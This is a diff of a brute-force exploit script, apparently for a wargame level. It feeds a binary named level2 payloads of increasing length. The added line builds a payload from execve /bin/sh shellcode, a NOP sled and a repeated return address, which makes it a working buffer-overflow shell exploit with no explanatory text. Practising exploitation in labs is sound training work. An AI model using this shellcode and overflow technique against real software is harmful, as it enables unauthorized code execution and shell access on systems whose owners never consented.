@@ -1,7 +1,7 @@
 #!/bin/bash
 
 for ((i=0; i<=140; i++)); do
-    payload=$(python -c "print(b'\x90'*$i + b'\x4a\x85\x04\xb8' * 4)")
+    payload=$(python -c "print(b'\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + '\x90'*$i + b'\x08\xa0\x04\x08' * 4)")
     echo "Trying payload length: $i"
     echo -ne "$payload" | ~/level2
 done
